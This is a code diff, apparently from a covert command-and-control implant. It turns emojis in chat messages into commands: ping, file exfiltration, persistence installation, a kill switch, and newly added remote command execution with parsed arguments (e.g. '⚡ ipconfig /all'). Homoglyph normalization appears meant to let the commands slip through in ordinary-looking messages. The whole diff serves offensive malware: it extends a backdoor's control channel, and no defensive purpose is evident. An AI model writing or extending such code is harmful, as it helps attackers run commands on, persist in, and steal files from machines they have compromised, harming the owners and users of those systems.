@@ -7,7 +7,8 @@ EMOJI_MAP = {
     '👋': 'cmd_ping',       # Ping
     '📂': 'cmd_exfil',      # Exfiltrate File
     '🔄': 'cmd_persist',    # Install Persistence
-    '🛑': 'cmd_exit'        # Kill Switch
+    '🛑': 'cmd_exit',       # Kill Switch
+    '⚡': 'cmd_exec'         # Remote Command Execution
 }
 
 def normalize_homoglyphs(text):
@@ -21,13 +22,17 @@ def extract_intent(message_content):
     
     for emoji, cmd_id in EMOJI_MAP.items():
         if emoji in clean_text:
-            # Check for arguments (text after the emoji)
+            # Split the message by the emoji
+            # Example: "⚡ ipconfig /all" -> ["", " ipconfig /all"]
             try:
-                args = clean_text.split(emoji)[1].strip()
-                # If args is empty string, make it None
-                if not args: args = None
-                return (cmd_id, args)
+                parts = clean_text.split(emoji, 1) # Split only on the first occurrence
+                if len(parts) > 1:
+                    args = parts[1].strip()
+                    if not args: args = None
+                    return (cmd_id, args)
             except IndexError:
                 return (cmd_id, None)
+            
+            return (cmd_id, None)
             
     return None
